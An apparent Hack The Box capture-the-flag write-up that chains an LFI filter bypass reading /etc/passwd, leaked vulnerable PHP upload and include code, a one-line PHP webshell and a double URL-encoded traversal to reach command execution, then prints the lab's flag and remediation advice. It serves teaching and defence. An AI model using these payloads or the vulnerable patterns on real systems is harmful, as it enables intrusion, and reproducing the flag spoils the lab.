File Inclusion — Skills Assessment

A full chain exploitation walkthrough: LFI path traversal bypass, source code disclosure via directory backtracking, unrestricted file upload to webshell, and double URL-encoding to achieve unauthenticated Remote Code Execution.

Offensive / Web App 4 Phases LFI · File Upload · RCE · Path Traversal

1. Scenario & Scope

This engagement simulates a black-box web application penetration test contracted by Sumace Consulting GmbH. During the kickoff meeting, the CISO noted the previous year's test returned zero findings, but a job application form had since been added — flagged as a potential area of interest.

Engagement Brief

Client: Sumace Consulting GmbH
Target: Main company website (single host)
Objective: Gain Remote Code Execution and retrieve the flag from the / root directory of the filesystem.
Prior findings: Zero (previous year) — new attack surface: job application form.

The attack chain ultimately chains four vulnerabilities together:

LFI Path Traversal

The image.php?p= parameter is vulnerable to traversal using the ....// filter bypass, leaking arbitrary files.

Unrestricted Upload

application.php accepts any file extension — a PHP webshell can be uploaded directly to the /uploads/ directory.

Double URL Encode

contact.php checks $_GET["region"] before calling urldecode(), allowing %252e/%252f to bypass the filter.

RCE via Include

Chaining the upload with the contact.php include gives full unauthenticated Remote Code Execution.

2. Reconnaissance

The recon phase begins with reviewing the site's HTML source. Inspecting the page reveals that images are served through a dedicated API endpoint rather than directly:

Source — image API endpoint discovered
/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c

The p parameter accepts a value that maps to a file. This is a classic indicator of a potential file inclusion or path traversal vulnerability — the server is resolving a filename based on user-controlled input.

Fuzzing the Parameter

Using ffuf with a dedicated LFI wordlist, we fuzz the p parameter and filter out empty responses (size 0) to identify which payloads produce output:

ffuf — LFI parameter fuzzing
ffuf -w LFI-Jhaddix.txt -u http://TARGET:PORT/api/image.php?p=FUZZ -fs 0

Results confirm the parameter is live and responding to traversal-style payloads. Next, we verify LFI manually with a targeted curl request using the ....// bypass technique:

curl — confirming LFI with ....// bypass
curl 'http://TARGET:PORT/api/image.php?p=....//....//....//....//....//....//etc/passwd'
The ....// bypass works because the server strips ../ sequences naively. After stripping, ....// collapses to ../ — effectively traversing up one directory level. Chaining multiple instances reaches the filesystem root.

The /etc/passwd file is successfully returned, confirming LFI is exploitable. The server is running PHP and the endpoint resolves files relative to a web root directory.

3. Source Code Disclosure

With LFI confirmed, the next step is to read the source code of pages we've identified on the site. Two pages of interest are visible in the navigation: contact.php and apply.php. By using the same traversal bypass, we can retrieve their raw PHP source:

Reading apply.php source via LFI
curl 'http://TARGET:PORT/api/image.php?p=....//apply.php'

Finding: Unrestricted File Upload in apply.php

The apply.php source reveals a job application form that POST's to /api/application.php. Retrieving that file's source exposes the upload handler logic:

application.php — upload handler (extracted)
$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));  // extension taken directly from filename
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);  // no extension validation
Critical finding: The extension is extracted directly from the original filename with zero validation. Any file type — including .php — will be accepted and stored. The uploaded file is saved as /uploads/<md5_of_file>.<ext>.

Finding: Double URL-Encode Bypass in contact.php

Retrieving contact.php source reveals a broken security check on the region GET parameter, which is passed directly to PHP's include():

contact.php — vulnerable include logic
// Step 1: Check for "." and "/" in the RAW GET value (already decoded once by PHP)
if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
    echo "Invalid character(s)";
    $danger = true;
} else {
    // Step 2: THEN manually URL-decode again
    $region = urldecode($_GET["region"]);
}

// Step 3: Include the result — traversal is possible after the second decode
include "./regions/" . $region . ".php";

The Double URL-Encoding Bypass

PHP automatically decodes the URL once before the script sees $_GET values. The check runs on that already-decoded value. Then the code calls urldecode() again. By double-encoding the forbidden characters, we pass the check and the second decode reconstructs the traversal sequence:

Character Single Encode Double Encode (sent) After PHP auto-decode After urldecode()
. (dot) %2e %252e %2e  ← passes check ✓ .
/ (slash) %2f %252f %2f  ← passes check ✓ /

 The check sees %2e and %2f — neither contains a literal dot or slash, so $danger stays false. The subsequent urldecode() call then converts them back into . and /, enabling full path traversal into the include statement.

4. Exploitation — Full RCE Chain

With two vulnerabilities identified — unrestricted file upload and an LFI-to-RCE path via contact.php — the attack chain becomes clear: upload a PHP webshell, then include it via the double-encoded traversal in contact.php.

1

Craft the Webshell

Create a minimal PHP webshell that passes the cmd GET parameter directly to system(). Save it as shell.php.

shell.php — webshell payload
<?php system($_GET["cmd"]); ?>
2

Calculate the MD5 Hash

The upload handler names files using md5_file() on the uploaded content. Pre-calculate the MD5 of our shell to know exactly where it will land.

Calculating the upload path
md5sum shell.php | cut -d' ' -f1
fc023fcacb27a7ad72d605c4e300b389

# Uploaded file will be at:
/uploads/fc023fcacb27a7ad72d605c4e300b389.php
3

Upload via the Application Form

Submit the webshell through the /apply.php job application form, providing dummy values for the required fields (firstName, lastName, email). The server accepts shell.php without complaint and stores it in /uploads/.

4

Trigger RCE via contact.php Include

Use the double URL-encoded traversal in the region parameter to include our uploaded webshell. Append the cmd parameter to execute arbitrary commands.

RCE — listing the filesystem root
http://TARGET:PORT/contact.php
  ?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389
  &cmd=ls%20/

# Decoded path that PHP resolves:
./regions/../uploads/fc023fcacb27a7ad72d605c4e300b389.php
# Which resolves to:
./uploads/fc023fcacb27a7ad72d605c4e300b389.php

The ls / output confirms the webshell is executing. Visible in the response is the flag file: flag_09ebca.txt

5

Read the Flag

Replace the ls / command with cat /flag_09ebca.txt to read the flag contents.

RCE — reading the flag
http://TARGET:PORT/contact.php
  ?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389
  &cmd=cat%20/flag_09ebca.txt

Flag Captured

Contents of /flag_09ebca.txt returned via webshell execution:

HTB{4lw4y5_s4n1t1ze_ur_1nput5_k1ds}

5. Vulnerability Summary & Remediation

Three distinct vulnerabilities were chained to achieve unauthenticated Remote Code Execution. Each has a straightforward fix — the difficulty is that any single one of these mitigations, applied in isolation, would have been sufficient to break the chain.

LFI via image.php

Fix: Use an allowlist of permitted file identifiers (e.g. MD5 hashes of known assets only). Never resolve user-supplied paths directly. Strip all traversal sequences server-side.

Unrestricted File Upload

Fix: Validate file extension against a strict allowlist (.pdf, .docx only). Store uploads outside the web root. Rename files and strip the original extension entirely.

Double URL-Encode Bypass

Fix: Perform the security check after all decoding steps, not before. Or better — replace the dynamic include() with a static map of valid region identifiers.

PHP include() on User Input

Fix: Never pass user-controlled data directly to include(), require(), or any file-loading function. Use a controller pattern with explicit file mappings.

Key Takeaways

  • LFI filter bypasses often rely on encoding tricks — always test ....//, null bytes, and URL encoding variants against any path parameter.
  • Reading server-side source code via LFI is often more valuable than the LFI itself — it reveals the full application logic and opens up secondary attack paths.
  • Unrestricted file upload is critical on its own, but devastating when combined with any file inclusion primitive on the same server.
  • Security checks must happen after all decoding steps — checking before a second urldecode() call is equivalent to having no check at all.
  • MD5 naming of uploads does not provide security — if you know or can predict the hash, you know exactly where the file lands.
  • Storing user uploads inside the web root is a hard no — files should live outside of it and be served through a controlled delivery mechanism.
